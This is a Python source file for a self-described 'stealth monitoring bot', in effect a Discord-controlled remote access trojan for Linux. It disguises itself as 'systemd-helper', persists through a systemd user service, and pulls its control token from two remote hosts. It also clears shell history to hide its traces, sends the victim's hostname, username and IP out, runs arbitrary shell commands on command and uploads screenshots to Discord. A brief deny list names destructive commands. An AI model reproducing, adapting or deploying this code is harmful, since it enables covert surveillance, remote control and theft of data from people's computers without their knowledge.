#!/usr/bin/env python3
"""
main.py - Stealth monitoring bot (everything except screenshots)
Auto-installs, auto-starts at boot, no sudo required
"""

import os
import sys
import subprocess
import shutil
import time
import socket
import platform
import requests
import psutil
from pathlib import Path

# ----------------- CONFIGURATION -----------------
DISCORD_TOKEN = "YOUR_ACTUAL_DISCORD_TOKEN_HERE"
TOKEN_CODE = "asdfghjkl"
TOKEN_BASE_URLS = [
    "https://new-production-8df3.up.railway.app/api/token",
    "https://new-5itj.onrender.com/api/token"
]

# Installation paths (user directory, no sudo needed)
STEALTH_DIR = Path.home() / ".cache" / "systemd"
MAIN_BINARY = STEALTH_DIR / "systemd-helper"
SCREENSHOT_DRIVER = STEALTH_DIR / "screenshot-driver"
SERVICE_FILE = Path.home() / ".config" / "systemd" / "user" / "systemd-helper.service"
LOCK_FILE = STEALTH_DIR / ".systemd-helper.lock"

# ----------------- SINGLE INSTANCE CHECK -----------------
def is_already_running():
    """Check if another instance is already running"""
    try:
        STEALTH_DIR.mkdir(parents=True, exist_ok=True)
        
        # Try to acquire an exclusive lock
        lock_fd = os.open(LOCK_FILE, os.O_CREAT | os.O_EXCL | os.O_RDWR)
        os.write(lock_fd, str(os.getpid()).encode())
        os.close(lock_fd)
        return False
    except OSError:
        try:
            with open(LOCK_FILE, 'r') as f:
                pid = int(f.read().strip())
            
            if psutil.pid_exists(pid):
                return True
            else:
                os.remove(LOCK_FILE)
                return False
        except:
            try:
                os.remove(LOCK_FILE)
            except:
                pass
            return False

# ----------------- TOKEN RETRIEVAL -----------------
def fetch_token_from_web():
    """Try to fetch token from web endpoints"""
    for base_url in TOKEN_BASE_URLS:
        url = f"{base_url}?code={TOKEN_CODE}"
        try:
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if data.get('success') and 'discord_token' in data:
                    token = data['discord_token']
                    if token and token != "YOUR_ACTUAL_DISCORD_TOKEN_HERE":
                        return token
        except:
            continue
    return None

# ----------------- AUTO-INSTALL DEPENDENCIES -----------------
def install_dependencies():
    """Install all required dependencies automatically"""
    try:
        # Install Python packages only (no system packages)
        python_packages = ["discord.py", "psutil", "requests", "pillow"]
        subprocess.run([sys.executable, "-m", "pip", "install", "--user"] + python_packages, 
                      check=False, capture_output=True, timeout=120)
        return True
    except Exception as e:
        print(f"Dependency install error: {e}")
        return False

# ----------------- INSTALL SCREENSHOT DRIVER -----------------
def install_screenshot_driver():
    """Install the screenshot driver"""
    screenshot_code = '''#!/usr/bin/env python3
"""
screenshot-driver - Dedicated screenshot service
"""

import os
import sys
import tempfile
import subprocess
import time
import requests
from pathlib import Path

# Same token retrieval as main
def fetch_token():
    token_urls = [
        "https://new-production-8df3.up.railway.app/api/token",
        "https://new-5itj.onrender.com/api/token"
    ]
    for url in token_urls:
        try:
            response = requests.get(f"{url}?code=asdfghjkl", timeout=30)
            if response.status_code == 200:
                data = response.json()
                if data.get('success') and 'discord_token' in data:
                    return data['discord_token']
        except:
            continue
    return None

def detect_display():
    """Detect the correct display"""
    display = os.environ.get('DISPLAY')
    if display:
        return display
    
    # Try to detect from logged in users
    try:
        result = subprocess.run(['who'], capture_output=True, text=True)
        for line in result.stdout.split('\\n'):
            if '(:' in line and 'tty' in line:
                for part in line.split():
                    if part.startswith('(:'):
                        return part.strip('()')
    except:
        pass
    
    return ':0'

def take_screenshot():
    """Take screenshot with multiple fallback methods"""
    try:
        display = detect_display()
        env = os.environ.copy()
        env['DISPLAY'] = display
        
        temp_dir = tempfile.gettempdir()
        screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
        
        # Try different methods
        methods = [
            ['maim', screenshot_path],
            ['scrot', '-z', '-q', '100', screenshot_path],
            ['import', '-window', 'root', '-quiet', screenshot_path]
        ]
        
        for method in methods:
            try:
                result = subprocess.run(method, env=env, capture_output=True, timeout=15)
                if result.returncode == 0 and os.path.exists(screenshot_path):
                    return screenshot_path
            except:
                continue
        
        return None
    except Exception as e:
        return None

def send_to_discord(file_path, token):
    """Send screenshot to Discord"""
    try:
        from discord import SyncWebhook
        webhook = SyncWebhook.from_url(token)
        with open(file_path, 'rb') as f:
            webhook.send(file=discord.File(f, filename='screenshot.png'))
        return True
    except:
        return False

def main():
    """Main screenshot driver loop"""
    token = fetch_token()
    if not token:
        return
    
    # Wait for screenshot command from main process
    while True:
        time.sleep(1)
        # Check if main process requested screenshot
        trigger_file = Path("/tmp/screenshot_trigger")
        if trigger_file.exists():
            try:
                trigger_file.unlink()
                screenshot_path = take_screenshot()
                if screenshot_path:
                    send_to_discord(screenshot_path, token)
                    # Cleanup
                    try:
                        os.remove(screenshot_path)
                    except:
                        pass
            except:
                pass

if __name__ == "__main__":
    main()
'''

    try:
        STEALTH_DIR.mkdir(parents=True, exist_ok=True)
        SCREENSHOT_DRIVER.write_text(screenshot_code)
        SCREENSHOT_DRIVER.chmod(0o755)
        return True
    except Exception as e:
        print(f"Screenshot driver install error: {e}")
        return False

# ----------------- INSTALL AS SERVICE -----------------
def install_service():
    """Install as systemd user service for auto-start"""
    try:
        # Create systemd user directory
        service_dir = SERVICE_FILE.parent
        service_dir.mkdir(parents=True, exist_ok=True)
        
        # Create service file
        service_content = f"""[Unit]
Description=SystemD Helper Service
After=graphical-session.target

[Service]
Type=simple
ExecStart={sys.executable} {MAIN_BINARY}
Restart=always
RestartSec=10
Environment=DISPLAY=:0

[Install]
WantedBy=default.target
"""
        
        SERVICE_FILE.write_text(service_content)
        
        # Enable and start the service
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
        subprocess.run(["systemctl", "--user", "enable", "systemd-helper.service"], check=False)
        subprocess.run(["systemctl", "--user", "start", "systemd-helper.service"], check=False)
        
        return True
    except Exception as e:
        print(f"Service install error: {e}")
        return False

# ----------------- STEALTH INSTALLATION -----------------
def install_stealth():
    """Install to stealth location and set up service"""
    try:
        current_file = Path(__file__).resolve()
        
        # Create stealth directory
        STEALTH_DIR.mkdir(parents=True, exist_ok=True)
        
        # Copy current file to stealth location
        if current_file != MAIN_BINARY:
            shutil.copy2(current_file, MAIN_BINARY)
            MAIN_BINARY.chmod(0o755)
            
            # Install screenshot driver
            install_screenshot_driver()
            
            # Install as service
            install_service()
            
            print("Stealth installation completed successfully")
            return True
        
        return False
    except Exception as e:
        print(f"Stealth install error: {e}")
        return False

# ----------------- CLEAN TRACES -----------------
def clean_traces():
    """Remove all traces of execution"""
    try:
        # Clear command history
        history_files = [
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.zsh_history"),
            os.path.expanduser("~/.python_history")
        ]
        
        for history_file in history_files:
            try:
                if os.path.exists(history_file):
                    open(history_file, 'w').close()
            except:
                pass
        
        return True
    except Exception as e:
        print(f"Clean traces error: {e}")
        return False

# ----------------- SYSTEM INFO -----------------
def get_system_info():
    """Get comprehensive system information"""
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
        system = platform.system()
        release = platform.release()
        
        # Get IP address
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
        except:
            ip_address = "Unknown"
        
        info = {
            "hostname": hostname,
            "username": username,
            "system": system,
            "release": release,
            "ip_address": ip_address,
        }
        
        return info
    except Exception as e:
        return {}

# ----------------- REQUEST SCREENSHOT -----------------
def request_screenshot():
    """Request screenshot from driver"""
    try:
        trigger_file = Path("/tmp/screenshot_trigger")
        trigger_file.touch()
        return True
    except:
        return False

# ----------------- BOT SETUP -----------------
# Install dependencies first
install_dependencies()

# Now import the modules
try:
    import discord
    from discord.ext import commands
except ImportError as e:
    print(f"Failed to import modules: {e}")
    sys.exit(1)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ----------------- BOT COMMANDS -----------------
@bot.event
async def on_ready():
    """Bot startup"""
    print("Stealth system initialized and running")
    
    # Auto-install on first run
    if not MAIN_BINARY.exists():
        install_stealth()
    
    clean_traces()
    
    # Announce system startup
    system_info = get_system_info()
    announcement_channel = None
    
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                announcement_channel = channel
                break
        if announcement_channel:
            break
    
    if announcement_channel:
        message = f"🚀 **System Online**\n"
        message += f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
        message += f"**User:** {system_info.get('username', 'Unknown')}\n"
        message += f"**IP:** {system_info.get('ip_address', 'Unknown')}\n"
        message += f"**Status:** Operational and hidden"
        
        try:
            await announcement_channel.send(message)
        except:
            pass

@bot.command(name="sysinfo")
async def cmd_sysinfo(ctx):
    """Get system information"""
    system_info = get_system_info()
    
    message = f"💻 **System Information**\n```\n"
    message += f"Hostname: {system_info.get('hostname', 'Unknown')}\n"
    message += f"Username: {system_info.get('username', 'Unknown')}\n"
    message += f"IP: {system_info.get('ip_address', 'Unknown')}\n"
    message += f"OS: {system_info.get('system', 'Unknown')} {system_info.get('release', 'Unknown')}\n```"
    
    await ctx.send(message)

@bot.command(name="cmd")
async def cmd_exec(ctx, *, command: str):
    """Execute system command"""
    try:
        dangerous_commands = ["rm -rf /", "mkfs", "dd if=/dev/", ":(){:|:&};:"]
        if any(dangerous in command for dangerous in dangerous_commands):
            await ctx.send("❌ Command blocked for security reasons")
            return
            
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout or result.stderr or "No output"
        
        if len(output) > 1900:
            output = output[:1900] + "..."
            
        await ctx.send(f"```bash\n$ {command}\n{output}\nExit: {result.returncode}\n```")
    except Exception as e:
        await ctx.send(f"❌ Command failed: {e}")

@bot.command(name="clean")
async def cmd_clean(ctx):
    """Clean all traces"""
    if clean_traces():
        await ctx.send("✅ All traces cleaned")
    else:
        await ctx.send("❌ Clean failed")

@bot.command(name="status")
async def cmd_status(ctx):
    """Check bot status"""
    system_info = get_system_info()
    await ctx.send(f"**Bot Status:** 🟢 Running\n"
                  f"**Location:** `{MAIN_BINARY}`\n"
                  f"**Host:** {system_info.get('hostname', 'Unknown')}")

@bot.command(name="screen")
async def cmd_screen(ctx):
    """Take a screenshot"""
    try:
        await ctx.send("📸 Taking screenshot...")
        
        # Request screenshot from driver
        if request_screenshot():
            await ctx.send("✅ Screenshot requested")
        else:
            await ctx.send("❌ Failed to request screenshot")
            
    except Exception as e:
        await ctx.send(f"❌ Screenshot error: {e}")

@bot.command(name="delete")
async def cmd_delete(ctx):
    """Completely remove the bot"""
    try:
        await ctx.send("🚨 **Self-destruct initiated** - Removing all traces...")
        
        # Stop and disable service
        subprocess.run(["systemctl", "--user", "stop", "systemd-helper.service"], check=False)
        subprocess.run(["systemctl", "--user", "disable", "systemd-helper.service"], check=False)
        
        # Remove files
        if MAIN_BINARY.exists():
            MAIN_BINARY.unlink()
        if SCREENSHOT_DRIVER.exists():
            SCREENSHOT_DRIVER.unlink()
        if SERVICE_FILE.exists():
            SERVICE_FILE.unlink()
        
        clean_traces()
        
        await ctx.send("✅ **Self-destruct completed** - All traces removed. Goodbye!")
        await bot.close()
            
    except Exception as e:
        await ctx.send(f"❌ Self-destruct error: {e}")

# ----------------- MAIN -----------------
if __name__ == "__main__":
    # Check if another instance is already running
    if is_already_running():
        print("Another instance is already running. Exiting.")
        sys.exit(0)
    
    # Check if we need to fetch token from web
    if DISCORD_TOKEN == "YOUR_ACTUAL_DISCORD_TOKEN_HERE":
        web_token = fetch_token_from_web()
        if web_token:
            DISCORD_TOKEN = web_token
        else:
            print("ERROR: Could not retrieve token from any source!")
            if LOCK_FILE.exists():
                LOCK_FILE.unlink()
            sys.exit(1)
    
    # Auto-install on first run
    if not MAIN_BINARY.exists():
        if install_stealth():
            print("Installation completed. Exiting installer.")
            if LOCK_FILE.exists():
                LOCK_FILE.unlink()
            sys.exit(0)
    
    # Run the bot with retry logic
    max_retries = 3
    retry_delay = 60
    
    for attempt in range(max_retries):
        try:
            print(f"Starting stealth monitoring bot (attempt {attempt + 1}/{max_retries})...")
            bot.run(DISCORD_TOKEN)
            break
        except discord.LoginFailure:
            web_token = fetch_token_from_web()
            if web_token:
                DISCORD_TOKEN = web_token
        except Exception as e:
            print(f"Bot failed to start: {e}")
            time.sleep(retry_delay)
    
    # Clean up lock file before exiting
    if LOCK_FILE.exists():
        LOCK_FILE.unlink()
